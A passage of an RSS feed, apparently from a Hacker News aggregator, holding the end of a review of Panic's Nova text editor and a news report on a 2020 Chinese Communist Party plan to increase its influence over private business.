href="https://t.umblr.com/redirect?z=https%3A%2F%2Flibrary.panic.com%2Fnova%2Fremote-tasks%2F&amp;t=OGUzY2QzZDY4ZmVlOTQ0MjMzYWEzNWRhNTUzMDVkMThiODk1YTYzNyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">remote tasks</a>. Nova has a serviceable Git client built in, too. Like VS Code, Nova uses JavaScript for its extension API, and it has built-in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmicrosoft.github.io%2Flanguage-server-protocol%2F&amp;t=M2M5YTYxZDY2Y2U1ODQxZDg0ZTVjMjJjOTRhN2Q4M2Y4NzhjNzNjZCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Language Server Protocol</a> support‚Äîit‚Äôs a superbly solid foundation.</p><p>Beyond that, some smaller features have become table stakes for modern GUI editors, and Nova handles them with aplomb. ‚ÄúOpen Quickly‚Äù can jump to any file in the open project, as well as search by symbols or just symbols in currently open files; it has a command palette; you can comprehensively edit keybindings. It has multiple cursor support for those of us who like that, and a ‚Äúmini map‚Äù view for those of you who like that, although know that you are wrong. Nova‚Äôs selection features include ‚ÄúSelect all in scope‚Äù and ‚ÄúSelect all between brackets,‚Äù a command I often use in BBEdit and miss dearly in Code. (Both Nova and BBEdit select between brackets and braces, although BBEdit also selects between parentheses.) This effectively becomes ‚ÄúSelect between tags‚Äù in HTML, a nice touch. There are a few other commands like ‚ÄúSelect all in function‚Äù and ‚ÄúSelect all in scope‚Äù that I didn‚Äôt have any luck in making work at all; a little more documentation would be nice.</p><p>That‚Äôs worth an aside. Panic has created a ‚Äúlibrary‚Äù of tech note-style articles about Nova sorted by publication date rather than an actual manual, and it‚Äôs not always easy to find the information you want in it. I know this is just what a technical writer would say, but I‚Äôd dearly like to see a human-organized table of contents starting with the editor basics and moving to advanced topics like version control, server publishing and extension authoring.</p><h3 id="the-zen-of-language-servers">The Zen of Language Servers</h3><p>A lot of Visual Studio Code‚Äôs smarts depend on the implementation of a ‚Äúlanguage server‚Äù behind the scenes: language servers offer almost spookily intelligent completion. For instance, take this PHP snippet:</p><pre><code>if ($allowed) {
    $response = new Response(405);
    $response-&gt;
</code></pre><p>If you have the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fbmewburn%2Fvscode-intelephense&amp;t=MmYzMGZmZWRhYzE5ZWU3MGVhNjI4YzE4N2UxZGY4YjA5NmU3NWJkZCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Intelephense</a> PHP language server plugin, Code understands that <code>$response</code> is an instance of <code>Response</code> and, after you type the <code>&gt;</code> above, offers completions of method names from the <code>Response</code> class.</p><p>Right now, Nova‚Äôs mostly limited to the language servers Panic provides, and they‚Äôre‚Ä¶ not always so smart. In that snippet above, Nova starts by offering completions of, apparently, <em>everything</em> in the open project, starting with the variables. If I type ‚Äús,‚Äù it narrows things down to methods that begin with ‚Äús,‚Äù but it‚Äôs <em>all</em> methods that start with ‚Äús‚Äù rather than just the methods from <code>Response</code>. The ‚ÄúJump to Definition‚Äù command shows a similar lack of context; if I highlight a method name that‚Äôs defined in multiple places, Nova shows me a popup menu and prompts me to choose which one to jump to, rather than introspecting the code to make that decision itself.</p><p>But, this is a solvable problem: there‚Äôs (I think) no reason someone couldn‚Äôt write an Inteliphense plugin for Nova. If Nova‚Äôs ecosystem takes off, it could be pretty formidable pretty quickly.</p><h2 id="walk-like-a-mac">Walk like a Mac</h2><p>Even so, LSP support isn‚Äôt Panic‚Äôs biggest selling point. Unlike Sublime Text or VS Code, Nova isn‚Äôt cross-platform: it‚Äôs a Mac-only program written to core platform APIs. Is that still a huge draw in 2020? (Is it instead a drawback?)</p><p>You can definitely see a difference between Nova and BBEdit on one side and Sublime and Code on the other in terms of resource usage. With the two Ruby files shown in the screenshot above loaded, I get:</p><ul><li>VS Code: 355 MB, 6 processes</li><li>Sublime Text: 338 MB, 2 processes</li><li>Nova: 101 MB, 2 processes</li><li>BBEdit: 97 MB, 1 process</li></ul><p>Code is an Electron-based program, although Microsoft famously puts a lot of effort into making it not feel like the black hole a lot of Electron-based apps are. Sublime uses its own proprietary cross-platform framework. In fairness, while us nerds like to harp on research usage a lot, if your computer‚Äôs got 16G or more of RAM in it, this probably isn‚Äôt a big deal.</p><p>You notice Nova‚Äôs essential Mac-ness in other ways. Its preference pane is, like BBEdit‚Äôs, an actual preference pane, instead of opening in another tab like Code or just opening a JSON file in a new tab (!) like Sublime. And while all editors better have first-class keyboard support‚Äîand Nova does‚Äîa good Mac editor should have first-class <em>mouse</em> support, too, and it does. You notice that in the drag-and-drop support for creating new tabs and splits. Nova‚Äôs sidebar is also highly customizable, possibly more so than any editor I‚Äôve regularly used. (Yes, Emacs fans, I know you can write all of Nova in Lisp if you want. When one of you does that, please get back to me.)</p><p>Unlike BBEdit, though, Nova doesn‚Äôt have a Mac-like title bar, or a Mac-like outline view of the project files, or Mac-like tabs. (Well, BBEdit doesn‚Äôt have tabs at all, which turns out to be a great UI decision once you have a dozen or more files open, but never mind.) This isn‚Äôt necessarily bad; people often say BBEdit ‚Äúlooks old,‚Äù and it‚Äôs hard not to suspect that what people mean by that‚Äîwhether or not they know it‚Äîis that it looks like the long-established Mac program it is. Nova is relying less on ‚Äúwe have a Mac UI and the other guys don‚Äôt‚Äù than on ‚Äúwe have Panic‚Äôs designers and the other guys don‚Äôt.‚Äù Make no mistake, having Panic‚Äôs designers counts for a lot.</p><p>What may be more disappointing to old school Mac nerds is AppleScript support: none whatsoever. It doesn‚Äôt even have a vestigial script dictionary. Again, this may not be something most people care much about; personally, I <em>hate</em> having to write AppleScript. But I love being <em>able</em> to write AppleScript. BBEdit‚Äôs extensive scriptability is one of its hidden strengths. Nova‚Äôs Node-based JavaScript engine is probably more powerful for its own extensions and certainly more accessible to anyone under the age of 50, but it may be hard to call it from external programs.</p><h2 id="so-is-it-worth-it">So is it worth it?</h2><p>That probably depends on where you‚Äôre coming from.</p><p>If you loved‚Äîor still use‚ÄîPanic‚Äôs older editor, Coda, this is a no-brainer upgrade. If you used <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.espressoapp.com&amp;t=MjQ4YTVhYjBiNTE0YjA4NGE5MzU2NDI3MTI2NTQ1NzU0ZWZhOGY1ZixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600748713">Espresso</a>, a Coda-ish editor that always seemed to be on the verge of greatness without ever reaching it, Nova may also be a no-brainer for you.</p><p>If you‚Äôre a fan of Sublime Text, BBEdit, TextMate, or another editor that doesn‚Äôt have native Language Server Protocol support, you should definitely <em>try</em> Nova. Sublime and TextMate have more plugins (especially Sublime), but many extensions seem to be languishing (especially TextMate). BBEdit never had a great extension ecosystem to start with. All of these editors have strengths Nova doesn‚Äôt, but the reverse is also true, and Nova may catch up.</p><p>If you‚Äôre an Emacs or Vim power user, we both know you‚Äôre just reading this out of academic interest and you‚Äôre not going to switch. C‚Äômon.</p><p>If you use Visual Studio Code, though, it‚Äôs way tougher to make the case for Nova. Code has a <em>vastly</em> larger extension library. It has the best support for LSP of any editor out there (LSP was developed <em>for</em> Code). Despite being ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review">https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review</a></em></p>]]>
            </description>
            <link>https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511824</guid>
            <pubDate>Fri, 18 Sep 2020 00:54:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CCP announces plan to take control of China's private sector]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24511672">thread link</a>) | @apsec112
<br/>
September 17, 2020 | https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector | <a href="https://web.archive.org/web/*/https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        
        
      
        <h3>(ATF)√Ç&nbsp;Chinese President Xi Jinping and the Communist Party's Central Committee have laid out a plan for a √¢‚Ç¨Àúnew era√¢‚Ç¨‚Ñ¢ in which the party has better control over private business in China. </h3><p><a href="http://www.xinhuanet.com/fortune/2020-09/15/c_1126497384.htm">The plan</a> was detailed in a 5,000-word statement √¢‚Ç¨‚Äú and all regions and departments in the country have been told to follow the new guidelines.</p><p><span>This was the top story on Wednesday's CCTV Evening News √¢‚Ç¨‚Äú how the president had issued √¢‚Ç¨≈ìimportant instructions√¢‚Ç¨ÔøΩ.</span></p><p><span>It had a long-winded title: "Opinion on Strengthening the United Front Work of the Private Economy in the New Era".</span></p><p><span>The ultimate goal is for the party to have ideological leadership of private enterprise.</span></p><p><span>The statement seeks to improve CCP control over private enterprise and entrepreneurs through United Front Work √¢‚Ç¨≈ìto better focus the wisdom and strengthen of the private businesspeople on the goal and mission to realise the great rejuvenation of the Chinese nation.√¢‚Ç¨ÔøΩ</span></p><p><span>Xi's instructions were issued ahead of a conference today on this very topic.√Ç&nbsp;</span>The party wants to see a "united front" between private enterprise and government business.</p><h3><figure><iframe frameborder="0" scrolling="no" allow="accelerometer; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" mozallowfullscreen="" webkitallowfullscreen="" oallowfullscreen="" msallowfullscreen="" allowtransparency="true" src="//player.vimeo.com/video/459459469"></iframe></figure>100 ways to rein in the private sector</h3><p>Since the 18th National Congress in May, members of the party's Central Committee and Comrade Xi have proposed a series of new concepts and strategies, and adopted a series of major measures to guide and promote private economic 'united front' work. They say these moves have achieved "remarkable results". </p><p>As China√¢‚Ç¨‚Ñ¢s private economy has grown and diversified, the statement says "these measures will bring about a great rejuvenation of the Chinese nation under Xi Jinping thought".</p><p>Overall, there are more than 100 measures, including guidance on selection of personnel to implement the measures. </p><p>"We must also see that socialism with Chinese characteristics has entered a new era, [as] the scale of the private economy has continued to expand, risks and challenges have increased significantly, the values and interests of the private economy have become increasingly diverse, and the united front work of the private economy is facing new situations and tasks," the statement says.</p><p>"In order to thoroughly implement the major decisions and deployments of the Party Central Committee, to further strengthen the Party's leadership of the private economic united front work, and to better integrate the wisdom and strength of private economic personnel to the goal and task of achieving the great rejuvenation of the Chinese nation, the following opinions are hereby offered."</p><p>The primary stated significance of the measures is √¢‚Ç¨≈ìenhancement of the party√¢‚Ç¨‚Ñ¢s leadership over the private economy √¢‚Ç¨‚Äú private economic figures are to be more closely united around the party.√¢‚Ç¨ÔøΩ</p><h3>More CCP involvement in business</h3><p>This is quite a turnaround. Previously, private business was not considered very worthy for party membership or influence, but it has gradually entered the heart of the regime.</p><p>According to the new provisions, private firms will need a certain amount of CCP registered employees, which is already a long-term practise in large private firms but not smaller ones. </p><p>These cadres will make sure businesses follow the guiding ideology√Ç&nbsp;√¢‚Ç¨≈ìGuided by Xi Jinping√¢‚Ç¨‚Ñ¢s Thought on Socialism with Chinese Characteristics for a New Era.√¢‚Ç¨ÔøΩ </p><p>They will also guide private business people to enhance the latest CCP catchphrases √¢‚Ç¨‚Äú √¢‚Ç¨≈ìfour consciousnesses√¢‚Ç¨ÔøΩ, strengthen the √¢‚Ç¨≈ìfour self-confidences√¢‚Ç¨ÔøΩ, and achieve the √¢‚Ç¨≈ìtwo safeguards.√¢‚Ç¨ÔøΩ</p><p>Duties of cadres will include the duties of strengthening ideological guidance,√Ç&nbsp;guiding private economic figures to increase their awareness of self-discipline, build a strong line of ideological and moral defence, strictly regulate their own words and deeds, cultivate a healthy lifestyle, and create a good public image.√Ç&nbsp;</p><p>They will also need to continuously improve law abidance and moral standards of private citizens.√Ç&nbsp;</p><p>Communication channels will be set up between private business and the party to report back on progress and other matters.</p>
      
      
        <p>Tags:</p>
      
      </article></div>]]>
            </description>
            <link>https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511672</guid>
            <pubDate>Fri, 18 Sep 2020 00:33:21 GMT</pubDate>
        </item>
    </channel>
</rss>
